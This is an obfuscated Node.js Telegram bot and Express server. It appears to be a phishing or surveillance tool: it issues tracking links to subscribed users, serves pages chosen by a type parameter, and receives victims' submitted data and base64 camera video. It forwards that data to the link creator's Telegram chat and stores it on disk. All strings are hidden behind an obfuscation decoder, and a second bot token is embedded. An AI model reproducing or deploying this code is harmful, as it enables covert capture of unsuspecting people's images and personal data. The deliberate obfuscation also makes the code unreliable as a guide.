const _0x247cf0 = _0x39a5;
(function (_0x21de71, _0x5cb0a9) {
    const _0x2c77ca = _0x39a5, _0x1f29ff = _0x21de71();
    while (!![]) {
        try {
            const _0x3ab1dc = parseInt(_0x2c77ca(0x657)) / (0x472 + -0x1 * -0x2494 + -0x2905) + parseInt(_0x2c77ca(0x577)) / (-0x1 * 0x1a51 + 0xaea + 0x523 * 0x3) * (-parseInt(_0x2c77ca(0x2c8)) / (-0x31f * -0xb + -0x236f + 0x11d)) + parseInt(_0x2c77ca(0x5ef)) / (-0x4 * -0x7f7 + -0x1112 + 0xec6 * -0x1) * (parseInt(_0x2c77ca(0x79e)) / (-0x1 * -0xc31 + 0x121f + -0x1e4b)) + -parseInt(_0x2c77ca(0x466)) / (0x428 * 0x8 + 0x12 * -0xb4 + 0x2 * -0xa49) + parseInt(_0x2c77ca(0x614)) / (-0xb5 * -0x3 + 0x7 * 0x128 + 0x8 * -0x146) * (-parseInt(_0x2c77ca(0x220)) / (-0x623 + -0x18d7 + 0x1f02)) + parseInt(_0x2c77ca(0x1d0)) / (0x153 * 0x13 + 0x1751 + -0x3071) + parseInt(_0x2c77ca(0x205)) / (-0x16dc + 0x2df * 0x3 + -0xe49 * -0x1) * (-parseInt(_0x2c77ca(0x573)) / (-0x2288 + 0x1 * 0x234b + -0x2 * 0x5c));
            if (_0x3ab1dc === _0x5cb0a9)
                break;
            else
                _0x1f29ff['push'](_0x1f29ff['shift']());
        } catch (_0x24e4eb) {
            _0x1f29ff['push'](_0x1f29ff['shift']());
        }
    }
}(_0x229b, 0xd * 0x8493 + 0xa09 * 0x82 + -0x1b * -0x11d5), require(_0x247cf0(0x57d))[_0x247cf0(0x257)]());
const TelegramBot = require(_0x247cf0(0x711) + _0x247cf0(0x2c1) + 'i'), express = require(_0x247cf0(0x5be)), bodyParser = require(_0x247cf0(0x92c) + 'r'), multer = require(_0x247cf0(0x791)), path = require(_0x247cf0(0x362)), fs = require('fs'), crypto = require(_0x247cf0(0x83f)), axios = require(_0x247cf0(0x45c)), uuid = require(_0x247cf0(0x3e9)), cheerio = require(_0x247cf0(0x669)), dns = require(_0x247cf0(0x940)), sleep = _0x3e634b => new Promise(_0xe6995b => setTimeout(_0xe6995b, _0x3e634b)), botToken = process[_0x247cf0(0x469)]['n'], botUsername = _0x247cf0(0x54e), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x247cf0(0x60f),
        _0x247cf0(0x93e),
        _0x247cf0(0x855),
        _0x247cf0(0x42d),
        _0x247cf0(0x5fc)
    ], SECOND_BOT_TOKEN = _0x247cf0(0x494) + _0x247cf0(0x4fb) + _0x247cf0(0x427) + _0x247cf0(0x29e) + _0x247cf0(0x23c), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x51e669 = _0x247cf0, _0x1c2ba0 = { 'gkBfy': _0x51e669(0x4da) + _0x51e669(0x3a9) };
    console[_0x51e669(0x6e8)](_0x1c2ba0[_0x51e669(0x3e1)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x54095e = {};
}
setInterval(clearCache, (-0x1555 + 0x5e1 + 0xb3e * 0x2) * (-0x16ea + -0x127e + 0x2d50));
async function isUserSubscribed(_0x2e0b58) {
    const _0x11c3eb = _0x247cf0, _0x5e6efa = {
            'giHDF': function (_0xa259b, _0x62f017) {
                return _0xa259b === _0x62f017;
            },
            'JKCje': _0x11c3eb(0x973),
            'oUiuk': function (_0x1bb75d, _0x5d2153) {
                return _0x1bb75d === _0x5d2153;
            },
            'NgLXi': _0x11c3eb(0x453) + _0x11c3eb(0x95b),
            'ZhkAt': function (_0x3a7f2f, _0x789730) {
                return _0x3a7f2f === _0x789730;
            },
            'sTNmU': _0x11c3eb(0x454),
            'hfock': _0x11c3eb(0x29b) + _0x11c3eb(0x24a) + _0x11c3eb(0x7f8) + _0x11c3eb(0x28d)
        };
    try {
        const _0x4baf6f = await Promise[_0x11c3eb(0x90b)](developerChannels[_0x11c3eb(0x1e4)](_0x1db89b => bot[_0x11c3eb(0x3dc) + _0x11c3eb(0x7c8)](_0x1db89b, _0x2e0b58)));
        return _0x4baf6f[_0x11c3eb(0x59c)](_0x4a0266 => {
            const _0x97b921 = _0x11c3eb, _0xca4710 = _0x4a0266[_0x97b921(0x428)];
            return _0x5e6efa[_0x97b921(0x4b2)](_0xca4710, _0x5e6efa[_0x97b921(0x83c)]) || _0x5e6efa[_0x97b921(0x8f7)](_0xca4710, _0x5e6efa[_0x97b921(0x729)]) || _0x5e6efa[_0x97b921(0x315)](_0xca4710, _0x5e6efa[_0x97b921(0x512)]);
        });
    } catch (_0x44f44e) {
        return console[_0x11c3eb(0x541)](_0x5e6efa[_0x11c3eb(0x55c)], _0x44f44e), ![];
    }
}
bot[_0x247cf0(0x89b)](/\/Vip/, async _0x26dfff => {
    const _0xe1f803 = _0x247cf0, _0x93e08 = {
            'KCSkG': function (_0x257c5c, _0x3a1bf8) {
                return _0x257c5c(_0x3a1bf8);
            },
            'YEOlV': _0xe1f803(0x22e) + _0xe1f803(0x25a) + _0xe1f803(0x89e) + _0xe1f803(0x46e) + _0xe1f803(0x62a) + _0xe1f803(0x874),
            'icxtw': _0xe1f803(0x732) + _0xe1f803(0x38c) + _0xe1f803(0x411) + _0xe1f803(0x88d) + _0xe1f803(0x8ec) + _0xe1f803(0x264) + _0xe1f803(0x630) + '.',
            'ovjqs': _0xe1f803(0x36e) + _0xe1f803(0x5d8) + _0xe1f803(0x291),
            'PDkcU': _0xe1f803(0x524) + _0xe1f803(0x8cd) + _0xe1f803(0x6c0) + _0xe1f803(0x489),
            'ssgDA': _0xe1f803(0x56d) + _0xe1f803(0x35f) + _0xe1f803(0x6af) + _0xe1f803(0x49a),
            'zGAWF': _0xe1f803(0x225) + _0xe1f803(0x8e8) + _0xe1f803(0x5c3)
        }, _0x20c574 = _0x26dfff[_0xe1f803(0x742)]['id'], _0x51da17 = _0x26dfff[_0xe1f803(0x246)]['id'], _0x5b623f = await _0x93e08[_0xe1f803(0x429)](isUserSubscribed, _0x20c574);
    if (!_0x5b623f) {
        const _0x559d3b = _0x93e08[_0xe1f803(0x5cc)], _0x4e9bfe = developerChannels[_0xe1f803(0x1e4)](_0x215677 => [{
                    'text': _0xe1f803(0x219) + _0x215677,
                    'url': _0xe1f803(0x402) + _0xe1f803(0x59d) + _0x215677[_0xe1f803(0x60b)](0x1aa0 + 0x27 * -0xc1 + 0x2c8)
                }]);
        bot[_0xe1f803(0x326) + 'e'](_0x20c574, _0x559d3b, { 'reply_markup': { 'inline_keyboard': _0x4e9bfe } });
        return;
    }
    const _0x36b721 = uuid['v4']();
    linkData[_0x36b721] = {
        'userId': _0x51da17,
        'chatId': _0x20c574,
        'visitors': []
    };
    const _0x55ed09 = _0x93e08[_0xe1f803(0x34b)];
    bot[_0xe1f803(0x326) + 'e'](_0x20c574, _0x55ed09, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x93e08[_0xe1f803(0x793)],
                        'callback_data': _0xe1f803(0x49e) + _0x36b721
                    }],
                [{
                        'text': _0x93e08[_0xe1f803(0x48f)],
                        'callback_data': _0xe1f803(0x49e) + _0x36b721
                    }],
                [{
                        'text': _0x93e08[_0xe1f803(0x5f9)],
                        'callback_data': _0xe1f803(0x49e) + _0x36b721
                    }],
                [{
                        'text': _0x93e08[_0xe1f803(0x383)],
                        'callback_data': _0xe1f803(0x49e) + _0x36b721
                    }]
            ]
        }
    });
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x23de7e => {
    const _0x275c7f = _0x247cf0, _0x470bb8 = {
            'ucPrV': function (_0xcc22e0, _0x385311) {
                return _0xcc22e0 === _0x385311;
            }
        }, _0x303552 = _0x23de7e[_0x275c7f(0x202)][_0x275c7f(0x742)]['id'], _0x58be46 = _0x23de7e[_0x275c7f(0x246)]['id'], _0xae004e = _0x23de7e[_0x275c7f(0x70e)][_0x275c7f(0x5ad)]('_')[-0x59b * 0x1 + -0x4 * 0x9b5 + 0x2c71 * 0x1];
    if (linkData[_0xae004e] && _0x470bb8[_0x275c7f(0x762)](linkData[_0xae004e][_0x275c7f(0x2c3)], _0x58be46)) {
        const _0x3e3fa9 = _0x275c7f(0x5d1) + _0x275c7f(0x32d) + _0x275c7f(0x8a1) + _0x275c7f(0x97a) + _0x275c7f(0x668) + _0x275c7f(0x367) + _0x275c7f(0x5c4) + _0x275c7f(0x238) + _0x275c7f(0x8f2) + _0x275c7f(0x1f2) + _0x275c7f(0x64a) + botUsername + _0x275c7f(0x2ab) + _0xae004e;
        bot[_0x275c7f(0x326) + 'e'](_0x303552, _0x3e3fa9);
    }
});
const baseUrl = process[_0x247cf0(0x469)]['r'];
bot[_0x247cf0(0x89b)](/\/vip (.+)/, async (_0x3b4bff, _0x4ad0c3) => {
    const _0x4bfc5c = _0x247cf0, _0x26f6e8 = {
            'TQDTv': function (_0x43f26c, _0x105f03) {
                return _0x43f26c(_0x105f03);
            },
            'MzJhQ': _0x4bfc5c(0x22e) + _0x4bfc5c(0x25a) + _0x4bfc5c(0x89e) + _0x4bfc5c(0x46e) + _0x4bfc5c(0x62a) + _0x4bfc5c(0x874),
            'nWwbn': function (_0x1576f0, _0x549053) {
                return _0x1576f0 !== _0x549053;
            }
        }, _0x36cc25 = _0x4ad0c3[0x2459 + 0x2697 + -0x4aef * 0x1], _0x3003de = _0x3b4bff[_0x4bfc5c(0x246)]['id'], _0x239a97 = _0x3b4bff[_0x4bfc5c(0x742)]['id'], _0x11ae82 = await _0x26f6e8[_0x4bfc5c(0x69d)](isUserSubscribed, _0x239a97);
    if (!_0x11ae82) {
        const _0x1dbfee = _0x26f6e8[_0x4bfc5c(0x47f)], _0x38a9be = developerChannels[_0x4bfc5c(0x1e4)](_0x56f1cf => [{
                    'text': _0x4bfc5c(0x219) + _0x56f1cf,
                    'url': _0x4bfc5c(0x402) + _0x4bfc5c(0x59d) + _0x56f1cf[_0x4bfc5c(0x60b)](-0x9 * -0x289 + -0x9 * -0x3a6 + -0x1bd3 * 0x2)
                }]);
        bot[_0x4bfc5c(0x326) + 'e'](_0x239a97, _0x1dbfee, { 'reply_markup': { 'inline_keyboard': _0x38a9be } });
        return;
    }
    if (linkData[_0x36cc25]) {
        const {
            userId: _0x26577f,
            visitors: _0x1e01f0
        } = linkData[_0x36cc25];
        if (_0x26f6e8[_0x4bfc5c(0x58b)](_0x3003de, _0x26577f) && (!visitorData[_0x3003de] || !visitorData[_0x3003de][_0x4bfc5c(0x882)](_0x26577f))) {
            _0x1e01f0[_0x4bfc5c(0x4cc)](_0x3003de);
            !visitorData[_0x3003de] && (visitorData[_0x3003de] = []);
            visitorData[_0x3003de][_0x4bfc5c(0x4cc)](_0x26577f);
            !userPoints[_0x26577f] && (userPoints[_0x26577f] = -0x651 + -0x89b + 0xeec);
            userPoints[_0x26577f] += -0x1 * -0x16f7 + -0x6a + -0x168c;
            const _0x458973 = _0x4bfc5c(0x20b) + _0x4bfc5c(0x890) + _0x4bfc5c(0x5c4) + _0x4bfc5c(0x7d0) + _0x4bfc5c(0x950) + _0x4bfc5c(0x748) + _0x4bfc5c(0x78c) + _0x4bfc5c(0x329) + _0x4bfc5c(0x6df) + _0x4bfc5c(0x1d7);
            bot[_0x4bfc5c(0x326) + 'e'](_0x239a97, _0x458973);
            const _0x4c9daf = _0x4bfc5c(0x56b) + _0x4bfc5c(0x1f5) + _0x4bfc5c(0x2e6) + _0x4bfc5c(0x2bc) + _0x4bfc5c(0x8ce);
            bot[_0x4bfc5c(0x326) + 'e'](_0x26577f, _0x4c9daf);
        }
    }
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x485653 => {
    const _0x5a9345 = _0x247cf0, _0x34628e = {
            'blUiy': function (_0x5479d4, _0x4bed85) {
                return _0x5479d4 === _0x4bed85;
            }
        }, _0x22e17e = _0x485653[_0x5a9345(0x202)][_0x5a9345(0x742)]['id'], _0x2008a6 = _0x485653[_0x5a9345(0x246)]['id'], _0x4ca66d = _0x485653[_0x5a9345(0x70e)][_0x5a9345(0x5ad)]('_')[-0x7fc + -0x1050 + 0x1 * 0x184e];
    if (linkData[_0x4ca66d] && _0x34628e[_0x5a9345(0x305)](linkData[_0x4ca66d][_0x5a9345(0x2c3)], _0x2008a6)) {
        const _0x2fd5f7 = _0x5a9345(0x5d1) + _0x5a9345(0x32d) + _0x5a9345(0x8a1) + _0x5a9345(0x97a) + _0x5a9345(0x668) + _0x5a9345(0x367) + _0x5a9345(0x5c4) + _0x5a9345(0x238) + _0x5a9345(0x8c8) + _0x5a9345(0x81a) + _0x5a9345(0x40c) + botUsername + _0x5a9345(0x2ab) + _0x4ca66d;
        bot[_0x5a9345(0x326) + 'e'](_0x22e17e, _0x2fd5f7);
    }
}), bot[_0x247cf0(0x89b)](/\/start (.+)/, async (_0x3e6f28, _0x2eff6c) => {
    const _0x167241 = _0x247cf0, _0x1bb5fc = {
            'oIIYv': function (_0x48c936, _0x5ab885) {
                return _0x48c936(_0x5ab885);
            },
            'TrWll': _0x167241(0x22e) + _0x167241(0x25a) + _0x167241(0x89e) + _0x167241(0x46e) + _0x167241(0x62a) + _0x167241(0x874),
            'toPef': function (_0xc468e, _0x34bd6c) {
                return _0xc468e !== _0x34bd6c;
            }
        }, _0x1b111f = _0x2eff6c[0x1 * 0x120d + 0x4b0 + 0x3 * -0x794], _0x1814fb = _0x3e6f28[_0x167241(0x246)]['id'], _0x576f52 = _0x3e6f28[_0x167241(0x742)]['id'], _0x15d707 = await _0x1bb5fc[_0x167241(0x588)](isUserSubscribed, _0x576f52);
    if (!_0x15d707) {
        const _0x4d922d = _0x1bb5fc[_0x167241(0x2eb)], _0x5ddba8 = developerChannels[_0x167241(0x1e4)](_0x22a4b5 => [{
                    'text': _0x167241(0x219) + _0x22a4b5,
                    'url': _0x167241(0x402) + _0x167241(0x59d) + _0x22a4b5[_0x167241(0x60b)](-0x84 * -0x2e + 0x2465 + -0x2 * 0x1e0e)
                }]);
        bot[_0x167241(0x326) + 'e'](_0x576f52, _0x4d922d, { 'reply_markup': { 'inline_keyboard': _0x5ddba8 } });
        return;
    }
    if (linkData[_0x1b111f]) {
        const {
            userId: _0x164637,
            chatId: _0xddb760,
            visitors: _0x591c34
        } = linkData[_0x1b111f];
        if (_0x1bb5fc[_0x167241(0x8e4)](_0x1814fb, _0x164637) && (!visitorData[_0x1814fb] || !visitorData[_0x1814fb][_0x167241(0x882)](_0x164637))) {
            _0x591c34[_0x167241(0x4cc)](_0x1814fb);
            !visitorData[_0x1814fb] && (visitorData[_0x1814fb] = []);
            visitorData[_0x1814fb][_0x167241(0x4cc)](_0x164637);
            !userPoints[_0x164637] && (userPoints[_0x164637] = -0x1 * -0x210b + -0x65 * -0x1 + -0x4 * 0x85c);
            userPoints[_0x164637] += 0x1 * -0xd18 + -0x2563 + 0x327c;
            const _0x988714 = _0x167241(0x20b) + _0x167241(0x890) + _0x167241(0x5c4) + _0x167241(0x7d0) + _0x167241(0x297) + _0x167241(0x410) + _0x167241(0x612) + _0x167241(0x449) + _0x167241(0x2bc) + _0x167241(0x7ec) + _0x167241(0x433);
            bot[_0x167241(0x326) + 'e'](_0xddb760, _0x988714);
        }
    }
});
const app = express();
app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x31b)]({
    'extended': !![],
    'limit': _0x247cf0(0x774)
})), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x71f)]({ 'limit': _0x247cf0(0x92a) })), app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname));
const storage = multer[_0x247cf0(0x859) + _0x247cf0(0x2fb)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x247cf0(0x7ba) });
function _0x39a5(_0x18299c, _0x4ec44b) {
    const _0xd4ff5d = _0x229b();
    return _0x39a5 = function (_0x523f4f, _0x132d94) {
        _0x523f4f = _0x523f4f - (-0x1b55 + 0x1 * -0xc2d + 0x294a);
        let _0x48abbf = _0xd4ff5d[_0x523f4f];
        return _0x48abbf;
    }, _0x39a5(_0x18299c, _0x4ec44b);
}
app[_0x247cf0(0x3d0)](_0x247cf0(0x283) + 'rm', (_0x3b1e26, _0x4d15de) => {
    const _0x1367e8 = _0x247cf0, _0x12aaf1 = {
            'QTdie': _0x1367e8(0x5a9) + _0x1367e8(0x32b) + _0x1367e8(0x822),
            'ICJYB': _0x1367e8(0x724),
            'RgmaR': _0x1367e8(0x279),
            'MvXym': _0x1367e8(0x2cb),
            'buJvR': _0x1367e8(0x584),
            'ssCYx': _0x1367e8(0x23b),
            'QPPpW': _0x1367e8(0x861)
        }, _0x3d0609 = _0x3b1e26[_0x1367e8(0x659)][_0x1367e8(0x7f1)], _0x51cf87 = _0x3b1e26[_0x1367e8(0x659)][_0x1367e8(0x717)];
    if (!_0x3d0609)
        return _0x4d15de[_0x1367e8(0x428)](0x174 + -0x1 * -0x3ad + -0x391)[_0x1367e8(0x626)](_0x12aaf1[_0x1367e8(0x727)]);
    let _0x9eb9f4 = '';
    switch (_0x51cf87) {
    case _0x12aaf1[_0x1367e8(0x7e5)]:
        _0x9eb9f4 = _0x12aaf1[_0x1367e8(0x8ba)];
        break;
    case _0x12aaf1[_0x1367e8(0x54f)]:
        _0x9eb9f4 = _0x12aaf1[_0x1367e8(0x28c)];
        break;
    case _0x12aaf1[_0x1367e8(0x690)]:
    default:
        _0x9eb9f4 = _0x12aaf1[_0x1367e8(0x3bd)];
        break;
    }
    _0x4d15de[_0x1367e8(0x911)](path[_0x1367e8(0x93f)](__dirname, _0x9eb9f4));
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x31e) + _0x247cf0(0x8f3), (_0x28d5a4, _0x16d70f) => {
    const _0x3925a7 = _0x247cf0, _0x6f7f53 = {
            'qfSnr': function (_0x78674b, _0x4b670e) {
                return _0x78674b(_0x4b670e);
            },
            'RRRQm': _0x3925a7(0x487),
            'UgMHm': _0x3925a7(0x3cd) + _0x3925a7(0x927) + _0x3925a7(0x5cd) + _0x3925a7(0x36f) + _0x3925a7(0x353) + _0x3925a7(0x384),
            'srhcf': _0x3925a7(0x6c6) + _0x3925a7(0x390) + _0x3925a7(0x688) + _0x3925a7(0x42b) + _0x3925a7(0x66b) + _0x3925a7(0x3b4)
        }, _0x2e40d6 = _0x28d5a4[_0x3925a7(0x325)][_0x3925a7(0x6c8)];
    _0x6f7f53[_0x3925a7(0x55f)](validateLinkUsage, _0x2e40d6) ? _0x16d70f[_0x3925a7(0x911)](path[_0x3925a7(0x93f)](__dirname, _0x6f7f53[_0x3925a7(0x981)])) : (_0x16d70f[_0x3925a7(0x626)](_0x6f7f53[_0x3925a7(0x977)]), bot[_0x3925a7(0x326) + 'e'](linkUsage[_0x2e40d6][_0x3925a7(0x7f1)], _0x6f7f53[_0x3925a7(0x7c4)]));
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x4ac) + _0x247cf0(0x581) + 'd', (_0xe68cdf, _0x2aaadd) => {
    const _0x4b1850 = _0x247cf0, _0x5946fb = {
            'CMQPl': function (_0x20842f, _0x3efa18) {
                return _0x20842f(_0x3efa18);
            },
            'zuqzj': _0x4b1850(0x563),
            'TFRCg': _0x4b1850(0x3cd) + _0x4b1850(0x927) + _0x4b1850(0x5cd) + _0x4b1850(0x36f) + _0x4b1850(0x353) + _0x4b1850(0x384),
            'GHFXw': _0x4b1850(0x6c6) + _0x4b1850(0x390) + _0x4b1850(0x688) + _0x4b1850(0x42b) + _0x4b1850(0x66b) + _0x4b1850(0x3b4)
        }, _0x423b8d = _0xe68cdf[_0x4b1850(0x325)][_0x4b1850(0x6c8)];
    _0x5946fb[_0x4b1850(0x868)](validateLinkUsage, _0x423b8d) ? _0x2aaadd[_0x4b1850(0x911)](path[_0x4b1850(0x93f)](__dirname, _0x5946fb[_0x4b1850(0x8c4)])) : (_0x2aaadd[_0x4b1850(0x626)](_0x5946fb[_0x4b1850(0x30f)]), bot[_0x4b1850(0x326) + 'e'](linkUsage[_0x423b8d][_0x4b1850(0x7f1)], _0x5946fb[_0x4b1850(0x72b)]));
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x8c1) + _0x247cf0(0x270), (_0x4e9ed6, _0x1ee100) => {
    const _0x40480f = _0x247cf0, _0x4f8265 = {
            'eeMWk': function (_0x42003e, _0xa5c8cf) {
                return _0x42003e(_0xa5c8cf);
            },
            'mIbmz': _0x40480f(0x2a9),
            'LxjwX': _0x40480f(0x3cd) + _0x40480f(0x927) + _0x40480f(0x5cd) + _0x40480f(0x36f) + _0x40480f(0x353) + _0x40480f(0x384),
            'pnlRz': _0x40480f(0x6c6) + _0x40480f(0x390) + _0x40480f(0x688) + _0x40480f(0x42b) + _0x40480f(0x66b) + _0x40480f(0x3b4)
        }, _0x5f49d0 = _0x4e9ed6[_0x40480f(0x325)][_0x40480f(0x6c8)];
    _0x4f8265[_0x40480f(0x6d0)](validateLinkUsage, _0x5f49d0) ? _0x1ee100[_0x40480f(0x911)](path[_0x40480f(0x93f)](__dirname, _0x4f8265[_0x40480f(0x629)])) : (_0x1ee100[_0x40480f(0x626)](_0x4f8265[_0x40480f(0x1d9)]), bot[_0x40480f(0x326) + 'e'](linkUsage[_0x5f49d0][_0x40480f(0x7f1)], _0x4f8265[_0x40480f(0x53f)]));
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x637) + _0x247cf0(0x68e), (_0x9b6a20, _0x1e88a) => {
    const _0x50ad41 = _0x247cf0, _0x5e700d = {
            'IbCMV': function (_0x2764af, _0x184117) {
                return _0x2764af(_0x184117);
            },
            'YqFYN': _0x50ad41(0x646),
            'goFEP': _0x50ad41(0x3cd) + _0x50ad41(0x927) + _0x50ad41(0x5cd) + _0x50ad41(0x36f) + _0x50ad41(0x353) + _0x50ad41(0x384),
            'DYREA': _0x50ad41(0x6c6) + _0x50ad41(0x390) + _0x50ad41(0x688) + _0x50ad41(0x42b) + _0x50ad41(0x66b) + _0x50ad41(0x3b4)
        }, _0x12c519 = _0x9b6a20[_0x50ad41(0x325)][_0x50ad41(0x6c8)];
    _0x5e700d[_0x50ad41(0x21b)](validateLinkUsage, _0x12c519) ? _0x1e88a[_0x50ad41(0x911)](path[_0x50ad41(0x93f)](__dirname, _0x5e700d[_0x50ad41(0x6aa)])) : (_0x1e88a[_0x50ad41(0x626)](_0x5e700d[_0x50ad41(0x760)]), bot[_0x50ad41(0x326) + 'e'](linkUsage[_0x12c519][_0x50ad41(0x7f1)], _0x5e700d[_0x50ad41(0x601)]));
}), app[_0x247cf0(0x69a)](_0x247cf0(0x6ae) + 'es', (_0x3830a2, _0x495dc4) => {
    const _0x570c03 = _0x247cf0, _0x3b08b4 = {
            'VGsmh': _0x570c03(0x4ea) + _0x570c03(0x327) + _0x570c03(0x824) + ':',
            'FUULR': _0x570c03(0x6fc) + _0x570c03(0x5b1),
            'ySrbf': _0x570c03(0x334)
        }, _0x54503f = _0x3830a2[_0x570c03(0x73b)][_0x570c03(0x7f1)], _0x78e414 = _0x3830a2[_0x570c03(0x73b)][_0x570c03(0x3fb)], _0x8b57f1 = _0x3830a2[_0x570c03(0x73b)][_0x570c03(0x3e8)];
    console[_0x570c03(0x6e8)](_0x3b08b4[_0x570c03(0x250)], _0x3830a2[_0x570c03(0x73b)]), bot[_0x570c03(0x326) + 'e'](_0x54503f, _0x570c03(0x4d2) + _0x570c03(0x6f4) + _0x570c03(0x78e) + ':\x20' + _0x78e414 + (_0x570c03(0x7d5) + _0x570c03(0x29d)) + _0x8b57f1)[_0x570c03(0x37b)](() => {
    })[_0x570c03(0x2de)](_0x13b6f4 => {
        const _0x3549b5 = _0x570c03;
        console[_0x3549b5(0x541)](_0x3b08b4[_0x3549b5(0x623)], _0x13b6f4[_0x3549b5(0x604)] ? _0x13b6f4[_0x3549b5(0x604)][_0x3549b5(0x73b)] : _0x13b6f4);
    }), _0x495dc4[_0x570c03(0x21c)](_0x3b08b4[_0x570c03(0x901)]);
}), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x71f)]()), app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x3d0)](_0x247cf0(0x2ea), (_0x219f8d, _0x324b40) => {
    const _0x5abbbe = _0x247cf0, _0x36851d = { 'gqjNq': _0x5abbbe(0x474) };
    _0x324b40[_0x5abbbe(0x911)](path[_0x5abbbe(0x93f)](__dirname, _0x36851d[_0x5abbbe(0x61b)]));
}), app[_0x247cf0(0x69a)](_0x247cf0(0x1ed) + _0x247cf0(0x7e4), (_0x2b5602, _0x22eb58) => {
    const _0x3f9c86 = _0x247cf0, _0x141bff = { 'zACPa': _0x3f9c86(0x4ea) + _0x3f9c86(0x327) + _0x3f9c86(0x824) + ':' }, _0x16e1e9 = _0x2b5602[_0x3f9c86(0x73b)][_0x3f9c86(0x7f1)], _0x1f7d7d = _0x2b5602[_0x3f9c86(0x73b)][_0x3f9c86(0x595) + 'r'];
    bot[_0x3f9c86(0x326) + 'e'](_0x16e1e9, _0x3f9c86(0x86e) + _0x3f9c86(0x2d2) + _0x3f9c86(0x870) + _0x3f9c86(0x644) + _0x3f9c86(0x8aa) + _0x3f9c86(0x1cd) + _0x3f9c86(0x7ed) + _0x3f9c86(0x34c) + ':\x20' + _0x1f7d7d)[_0x3f9c86(0x37b)](() => {
        const _0x49015f = _0x3f9c86;
        _0x22eb58[_0x49015f(0x71f)]({ 'success': !![] });
    })[_0x3f9c86(0x2de)](_0x284238 => {
        const _0x18675e = _0x3f9c86;
        console[_0x18675e(0x541)](_0x141bff[_0x18675e(0x617)], _0x284238[_0x18675e(0x604)] ? _0x284238[_0x18675e(0x604)][_0x18675e(0x73b)] : _0x284238), _0x22eb58[_0x18675e(0x71f)]({ 'success': ![] });
    });
}), app[_0x247cf0(0x69a)](_0x247cf0(0x5f5) + 'e', (_0x108a15, _0x10d718) => {
    const _0x5c13de = _0x247cf0, _0x260e51 = {
            'wGIGL': _0x5c13de(0x674) + _0x5c13de(0x8d2) + _0x5c13de(0x7d9),
            'moMLv': _0x5c13de(0x4ea) + _0x5c13de(0x327) + _0x5c13de(0x824) + ':'
        }, _0x1fb325 = _0x108a15[_0x5c13de(0x73b)][_0x5c13de(0x7f1)], _0x2105ad = _0x108a15[_0x5c13de(0x73b)][_0x5c13de(0x5d3)];
    bot[_0x5c13de(0x326) + 'e'](_0x1fb325, _0x5c13de(0x983) + _0x5c13de(0x7ad) + _0x5c13de(0x29a) + '\x20' + _0x2105ad)[_0x5c13de(0x37b)](() => {
        const _0x308e5c = _0x5c13de;
        _0x10d718[_0x308e5c(0x21c)](_0x260e51[_0x308e5c(0x2ff)]);
    })[_0x5c13de(0x2de)](_0x4c80a9 => {
        const _0x133547 = _0x5c13de;
        console[_0x133547(0x541)](_0x260e51[_0x133547(0x551)], _0x4c80a9[_0x133547(0x604)] ? _0x4c80a9[_0x133547(0x604)][_0x133547(0x73b)] : _0x4c80a9), _0x10d718[_0x133547(0x71f)]({ 'success': ![] });
    });
}), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x71f)]({ 'limit': _0x247cf0(0x240) })), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x31b)]({
    'limit': _0x247cf0(0x240),
    'extended': !![]
}));
const dataStore = {};
app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x69a)](_0x247cf0(0x610) + 'eo', (_0x20adad, _0x205a93) => {
    const _0x6ab5bb = _0x247cf0, _0xd1e239 = {
            'XRplP': _0x6ab5bb(0x35e),
            'tKPQv': _0x6ab5bb(0x4ea) + _0x6ab5bb(0x749),
            'ixhjg': _0x6ab5bb(0x618) + _0x6ab5bb(0x528),
            'JgOlt': function (_0x41ac83, _0x5e1a94) {
                return _0x41ac83 || _0x5e1a94;
            },
            'DssGw': _0x6ab5bb(0x30e) + _0x6ab5bb(0x6bb) + _0x6ab5bb(0x7bf) + _0x6ab5bb(0x4b0) + _0x6ab5bb(0x2d9),
            'mrmCm': _0x6ab5bb(0x896),
            'ymVkz': _0x6ab5bb(0x419),
            'XryXn': _0x6ab5bb(0x85c) + _0x6ab5bb(0x27e) + _0x6ab5bb(0x899),
            'TOJNU': _0x6ab5bb(0x4eb) + _0x6ab5bb(0x4ed) + _0x6ab5bb(0x93b),
            'sefVB': _0x6ab5bb(0x618) + _0x6ab5bb(0x4a9) + _0x6ab5bb(0x650)
        }, _0x4e3816 = _0x20adad[_0x6ab5bb(0x73b)][_0x6ab5bb(0x7f1)], _0x5b21a0 = _0x20adad[_0x6ab5bb(0x73b)][_0x6ab5bb(0x404)];
    if (_0xd1e239[_0x6ab5bb(0x3a0)](!_0x4e3816, !_0x5b21a0))
        return _0x205a93[_0x6ab5bb(0x428)](-0x1 * 0x18f5 + 0x6 * -0x1c5 + 0x1 * 0x2523)[_0x6ab5bb(0x626)](_0xd1e239[_0x6ab5bb(0x845)]);
    const _0x4d3a3b = _0x5b21a0[_0x6ab5bb(0x5ad)](',')[0xb7 + 0x22 * -0xae + 0x1666], _0x3fdef7 = path[_0x6ab5bb(0x93f)](__dirname, _0xd1e239[_0x6ab5bb(0x510)]);
    !fs[_0x6ab5bb(0x817)](_0x3fdef7) && fs[_0x6ab5bb(0x1f9)](_0x3fdef7);
    try {
        const _0x1fa832 = Buffer[_0x6ab5bb(0x246)](_0x4d3a3b, _0xd1e239[_0x6ab5bb(0x633)]), _0x497210 = path[_0x6ab5bb(0x93f)](_0x3fdef7, _0x4e3816 + _0x6ab5bb(0x925));
